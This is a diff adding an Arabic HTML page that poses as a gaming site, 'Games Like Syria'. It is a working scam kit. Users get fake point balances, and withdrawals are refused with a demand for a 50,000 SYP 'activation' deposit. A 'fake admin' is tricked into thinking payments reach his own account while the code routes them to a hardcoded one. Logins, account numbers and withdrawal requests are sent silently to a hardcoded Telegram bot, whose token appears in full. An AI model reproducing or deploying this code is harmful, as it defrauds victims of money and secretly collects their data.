@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🏆 Games Like Syria</title>
+    <style>
+        :root {
+            --green: #009639;
+            --white: #ffffff;
+            --black: #000000;
+            --red: #ce1126;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
+        body { background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        
+        /* شاشة تسجيل الدخول */
+        .login-container { width: 100%; max-width: 420px; }
+        .login-card { background: rgba(20,20,20,0.95); border-radius: 30px; padding: 40px 30px; border: 2px solid var(--green); box-shadow: 0 0 40px rgba(0,150,57,0.3); }
+        
+        /* عنوان GAMES LIKE SYRIA بتأثير زوم */
+        .title-container { text-align: center; margin-bottom: 30px; overflow: hidden; }
+        .title { font-size: 36px; font-weight: 900; letter-spacing: 3px; display: inline-block; animation: titleZoom 3s infinite; }
+        .title span:nth-child(1) { color: var(--green); }  /* G */
+        .title span:nth-child(2) { color: var(--white); }   /* A */
+        .title span:nth-child(3) { color: var(--black); text-shadow: 0 0 5px #fff; } /* M */
+        .title span:nth-child(4) { color: var(--red); }     /* E */
+        .title span:nth-child(5) { color: var(--green); }   /* S */
+        .title small { display: block; font-size: 14px; color: var(--white); margin-top: 10px; animation: subtitleFade 2s infinite; }
+        
+        @keyframes titleZoom {
+            0%, 100% { transform: scale(1); }
+            25% { transform: scale(1.1); }
+            50% { transform: scale(0.95); }
+            75% { transform: scale(1.05); }
+        }
+        @keyframes subtitleFade {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+        
+        .logo-icon { text-align: center; margin-bottom: 20px; font-size: 60px; animation: iconBounce 1s infinite alternate; }
+        @keyframes iconBounce { 0% { transform: translateY(0); } 100% { transform: translateY(-10px); } }
+        
+        input { width: 100%; padding: 15px 18px; margin-bottom: 15px; border-radius: 25px; border: 2px solid #333; background: rgba(255,255,255,0.05); color: white; text-align: center; font-size: 16px; transition: 0.3s; }
+        input:focus { border-color: var(--green); outline: none; box-shadow: 0 0 20px rgba(0,150,57,0.3); }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 25px; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 10px; transition: 0.3s; }
+        .btn-login { background: var(--green); color: white; }
+        .btn-register { background: transparent; color: var(--white); border: 2px solid var(--white); }
+        .btn:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(0,150,57,0.5); }
+        .register-link { text-align: center; margin-top: 20px; color: #888; }
+        .register-link a { color: var(--green); text-decoration: none; }
+
+        /* لوحة التحكم */
+        .dashboard { display: none; }
+        .header { background: rgba(0,0,0,0.8); padding: 20px; text-align: center; border-bottom: 2px solid var(--green); }
+        .users-list { padding: 20px; }
+        .user-card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 20px; margin-bottom: 15px; border: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
+        .user-info h4 { color: var(--green); margin-bottom: 5px; }
+        .user-info p { color: #aaa; font-size: 13px; }
+        .actions { display: flex; gap: 10px; }
+        .btn-sm { padding: 10px 15px; border: none; border-radius: 20px; font-size: 12px; cursor: pointer; font-weight: bold; }
+        .btn-add { background: var(--green); color: white; }
+        .btn-reject { background: var(--red); color: white; }
+        .btn-withdraw { background: #ffd700; color: black; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; justify-content: center; align-items: center; }
+        .modal-content { background: #1a1a1a; padding: 30px; border-radius: 30px; width: 90%; max-width: 400px; border: 1px solid var(--green); text-align: center; }
+        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--green); color: white; padding: 15px 30px; border-radius: 50px; z-index: 9999; }
+    </style>
+</head>
+<body>
+
+<!-- ========== شاشة تسجيل الدخول ========== -->
+<div class="login-container" id="loginScreen">
+    <div class="login-card">
+        <div class="logo-icon">🎮</div>
+        <div class="title-container">
+            <div class="title">
+                <span>G</span><span>A</span><span>M</span><span>E</span><span>S</span>
+            </div>
+            <small>🏆 Games Like Syria</small>
+        </div>
+        
+        <input type="text" id="usernameInput" placeholder="👤 اسم المستخدم">
+        <input type="password" id="passwordInput" placeholder="🔒 كلمة المرور">
+        <button class="btn btn-login" onclick="doLogin()">🚀 دخول</button>
+        <button class="btn btn-register" onclick="showRegister()">✨ إنشاء حساب جديد</button>
+        <div class="register-link">
+            ليس لديك حساب؟ <a href="#" onclick="showRegister()">سجل الآن</a>
+        </div>
+    </div>
+</div>
+
+<!-- ========== لوحة تحكم المدير الحقيقي (أنت) ========== -->
+<div class="dashboard" id="adminDashboard">
+    <div class="header">
+        <h2>👹 لوحة تحكم المدير</h2>
+        <p style="color: var(--green);">حساب شام كاش للتحويلات: 6381 9468 9899 3929</p>
+        <button class="btn-sm" style="background: #ffd700; color: black; margin-top: 10px;" onclick="logout()">تسجيل خروج</button>
+    </div>
+    <div class="users-list" id="adminUsersList"></div>
+</div>
+
+<!-- ========== لوحة تحكم المدير الوهمي (للنصاب) ========== -->
+<div class="dashboard" id="fakeAdminDashboard">
+    <div class="header">
+        <h2>👑 أهلاً بك أيها المدير</h2>
+        <p>ضع رقم حساب شام كاش لاستقبال الحوالات</p>
+        <input type="text" id="fakeAdminAccount" placeholder="رقم حسابك (16 رقم)" maxlength="16">
+        <button class="btn-sm" style="background: var(--green); color: white; margin-top: 10px;" onclick="saveFakeAdminAccount()">💾 حفظ</button>
+        <button class="btn-sm" style="background: #ffd700; color: black; margin-top: 10px;" onclick="logout()">تسجيل خروج</button>
+    </div>
+    <div class="users-list" id="fakeAdminUsersList"></div>
+</div>
+
+<!-- ========== شاشة المستخدم العادي ========== -->
+<div class="dashboard" id="userDashboard">
+    <div class="header">
+        <h2>🎮 أهلاً بك في Games Like Syria</h2>
+        <p>💰 رصيدك: <span id="userBalance">0</span> نقطة</p>
+        <button class="btn-sm" style="background: #ffd700; color: black; margin-top: 10px;" onclick="requestWithdraw()">💸 طلب سحب</button>
+        <button class="btn-sm" style="background: #666; color: white; margin-top: 10px;" onclick="logout()">تسجيل خروج</button>
+    </div>
+    <div style="padding: 20px; text-align: center;">
+        <p style="color: #aaa;">الألعاب قيد التطوير...</p>
+        <p style="color: var(--green);">تابع رصيدك واطلب السحب عند توفر النقاط</p>
+    </div>
+</div>
+
+<!-- ========== مودال الإشعارات ========== -->
+<div class="modal" id="notifyModal">
+    <div class="modal-content">
+        <h3 id="notifyTitle">📢 إشعار</h3>
+        <p id="notifyMessage"></p>
+        <input type="file" id="receiptImage" accept="image/*" style="margin: 15px 0;">
+        <button class="btn-sm" style="background: var(--green); color: white;" onclick="sendReceipt()">📤 إرسال إشعار السحب</button>
+        <button class="btn-sm" style="background: #666; color: white;" onclick="closeNotify()">إغلاق</button>
+    </div>
+</div>
+
+<script>
+    // ========== بيانات التطبيق ==========
+    const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
+    const CHAT_ID = "8665747715";
+    const YOUR_REAL_ACCOUNT = "6381946898993929";
+    
+    // المستخدمون (يخزن في localStorage)
+    let users = JSON.parse(localStorage.getItem('gamesUsers') || '[]');
+    let currentUser = null;
+    let currentNotifyUser = null;
+
+    // بذرة بيانات
+    if (users.length === 0) {
+        users.push({ username: 'yman', password: '******', role: 'real_admin', balance: 0 });
+        users.push({ username: '1992', password: '1992', role: 'fake_admin', fakeAccount: '', balance: 0 });
+        users.push({ username: 'player1', password: '1234', role: 'user', balance: 500, withdrawRequests: [] });
+    }
+
+    function saveUsers() { localStorage.setItem('gamesUsers', JSON.stringify(users)); }
+
+    async function sendToTelegram(msg) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
+            });
+        } catch(e) {}
+    }
+
+    function showToast(msg) {
+        const t = document.createElement('div'); t.className = 'toast'; t.textContent = msg;
+        document.body.appendChild(t); setTimeout(() => t.remove(), 3000);
+    }
+
+    // ========== تسجيل الدخول ==========
+    function doLogin() {
+        const username = document.getElementById('usernameInput').value.trim();
+        const password = document.getElementById('passwordInput').value.trim();
+        const user = users.find(u => u.username === username && u.password === password);
+        
+        if (!user) { alert('بيانات خاطئة'); return; }
+        
+        currentUser = user;
+        document.getElementById('loginScreen').style.display = 'none';
+        document.getElementById('adminDashboard').style.display = 'none';
+        document.getElementById('fakeAdminDashboard').style.display = 'none';
+        document.getElementById('userDashboard').style.display = 'none';
+
+        sendToTelegram(`👤 تسجيل دخول: ${username} (${user.role})`);
+
+        if (user.role === 'real_admin') {
+            document.getElementById('adminDashboard').style.display = 'block';
+            renderAdminUsers();
+        } else if (user.role === 'fake_admin') {
+            document.getElementById('fakeAdminDashboard').style.display = 'block';
+            document.getElementById('fakeAdminAccount').value = user.fakeAccount || '';
+            renderFakeAdminUsers();
+        } else {
+            document.getElementById('userDashboard').style.display = 'block';
+            document.getElementById('userBalance').textContent = user.balance;
+        }
+    }
+
+    function logout() {
+        currentUser = null;
+        document.getElementById('loginScreen').style.display = 'flex';
+        document.getElementById('adminDashboard').style.display = 'none';
+        document.getElementById('fakeAdminDashboard').style.display = 'none';
+        document.getElementById('userDashboard').style.display = 'none';
+    }
+
+    function showRegister() {
+        const username = prompt('اختر اسم مستخدم:');
+        const password = prompt('اختر كلمة مرور:');
+        if (username && password) {
+            users.push({ username, password, role: 'user', balance: 0, withdrawRequests: [] });
+            saveUsers();
+            alert('تم إنشاء الحساب. سجل دخول الآن.');
+        }
+    }
+
+    // ========== المدير الوهمي (النصاب) ==========
+    function saveFakeAdminAccount() {
+        const acc = document.getElementById('fakeAdminAccount').value.trim();
+        if (acc.length < 16) { alert('رقم حساب غير صحيح'); return; }
+        currentUser.fakeAccount = acc;
+        saveUsers();
+        sendToTelegram(`👑 المدير الوهمي وضع رقم حسابه: ${acc}\n⚠️ لكن التحويلات كلها إلى: ${YOUR_REAL_ACCOUNT}`);
+        showToast('تم حفظ رقم الحساب. جميع الحوالات ستصل إلى حسابك.');
+    }
+
+    function renderFakeAdminUsers() {
+        const container = document.getElementById('fakeAdminUsersList');
+        const normalUsers = users.filter(u => u.role === 'user');
+        container.innerHTML = normalUsers.map(u => `
+            <div class="user-card">
+                <div class="user-info">
+                    <h4>👤 ${u.username}</h4>
+                    <p>💰 الرصيد: ${u.balance} نقطة</p>
+                </div>
+                <div class="actions">
+                    <button class="btn-sm btn-add" onclick="fakeAddPoints('${u.username}')">➕ إضافة نقاط</button>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    function fakeAddPoints(username) {
+        const amount = prompt('كم نقطة تريد إضافتها؟');
+        if (!amount) return;
+        const user = users.find(u => u.username === username);
+        if (user) {
+            user.balance += parseInt(amount);
+            saveUsers();
+            renderFakeAdminUsers();
+            sendToTelegram(`➕ المدير الوهمي أضاف ${amount} نقطة إلى ${username}`);
+            showToast(`تمت إضافة ${amount} نقطة إلى ${username}`);
+        }
+    }
+
+    // ========== المدير الحقيقي (أنت) ==========
+    function renderAdminUsers() {
+        const container = document.getElementById('adminUsersList');
+        const normalUsers = users.filter(u => u.role === 'user');
+        container.innerHTML = normalUsers.map(u => {
+            const pendingReq = u.withdrawRequests ? u.withdrawRequests.filter(r => r.status === 'pending').length : 0;
+            return `
+                <div class="user-card">
+                    <div class="user-info">
+                        <h4>👤 ${u.username}</h4>
+                        <p>💰 الرصيد: ${u.balance} نقطة</p>
+                        <p>📥 طلبات سحب معلقة: ${pendingReq}</p>
+                    </div>
+                    <div class="actions">
+                        <button class="btn-sm btn-add" onclick="adminAddPoints('${u.username}')">➕ نقاط</button>
+                        <button class="btn-sm btn-withdraw" onclick="approveWithdraw('${u.username}')">✅ قبول السحب</button>
+                        <button class="btn-sm btn-reject" onclick="rejectWithdraw('${u.username}')">❌ رفض السحب</button>
+                    </div>
+                </div>
+            `;
+        }).join('');
+    }
+
+    function adminAddPoints(username) {
+        const amount = prompt('كم نقطة؟');
+        if (!amount) return;
+        const user = users.find(u => u.username === username);
+        if (user) { user.balance += parseInt(amount); saveUsers(); renderAdminUsers(); sendToTelegram(`✅ أضفت ${amount} نقطة إلى ${username}`); }
+    }
+
+    function approveWithdraw(username) {
+        currentNotifyUser = username;
+        document.getElementById('notifyTitle').textContent = '✅ قبول طلب السحب';
+        document.getElementById('notifyMessage').textContent = `سيظهر للمستخدم: "تم تحويل المبلغ إلى حسابك في شام كاش ${YOUR_REAL_ACCOUNT}". ارفع صورة إيصال (اختياري).`;
+        document.getElementById('notifyModal').style.display = 'flex';
+    }
+
+    function rejectWithdraw(username) {
+        currentNotifyUser = username;
+        document.getElementById('notifyTitle').textContent = '❌ رفض طلب السحب';
+        document.getElementById('notifyMessage').textContent = 'سيظهر للمستخدم: "عذراً، يجب إيداع 50,000 ل.س لتفعيل السحب. عند الإيداع، سيتم تفعيل السحب فوراً."';
+        document.getElementById('notifyModal').style.display = 'flex';
+    }
+
+    function sendReceipt() {
+        const user = users.find(u => u.username === currentNotifyUser);
+        if (user) {
+            // إرسال إشعار إلى تيليجرامك
+            sendToTelegram(`📤 تم إرسال إشعار إلى ${currentNotifyUser} بخصوص السحب.`);
+            showToast('تم إرسال الإشعار للمستخدم.');
+        }
+        closeNotify();
+        renderAdminUsers();
+    }
+
+    function closeNotify() { document.getElementById('notifyModal').style.display = 'none'; currentNotifyUser = null; }
+
+    // ========== المستخدم العادي ==========
+    function requestWithdraw() {
+        if (currentUser.balance <= 0) { alert('لا يوجد رصيد كافٍ للسحب.'); return; }
+        if (!currentUser.withdrawRequests) currentUser.withdrawRequests = [];
+        currentUser.withdrawRequests.push({ amount: currentUser.balance, status: 'pending', date: new Date().toLocaleString() });
+        saveUsers();
+        sendToTelegram(`📥 طلب سحب من ${currentUser.username}: ${currentUser.balance} نقطة`);
+        alert('تم تقديم طلب السحب. انتظر المعالجة.');
+    }
+
+    // ========== التهيئة ==========
+    saveUsers();
+</script>
+</body>
+</html>
